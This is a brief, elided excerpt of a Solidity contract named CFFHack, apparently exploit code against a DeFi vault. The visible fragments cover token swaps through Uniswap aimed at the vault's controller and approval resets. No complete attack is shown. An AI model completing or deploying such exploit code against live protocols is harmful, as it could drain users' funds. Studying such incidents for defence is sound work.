...
contract CFFHack{
    ...
    function mintAndLoan(uint256 borrowAmount) public returns(uint256){
        ...
        uniswap.swapETHForExactTokens.value(balance)(uint256(9)**17 * 999, path,
                                                    cfVault.controller(), block.timestamp+ 9999);
    ...
    function swap(address dex, address[] memory swap_path, uint amount) public {
        SwapInterface(dex).swapETHForExactTokens.value(address(this).balance)(amount, swap_path, address(this), block.timestamp + 10799);
    }
    ...
    function supplyUSDC() public{
        // approve tokens
        dai.approve(address(cfVault), 1);
        dai.approve(address(cfVault),uint(0));
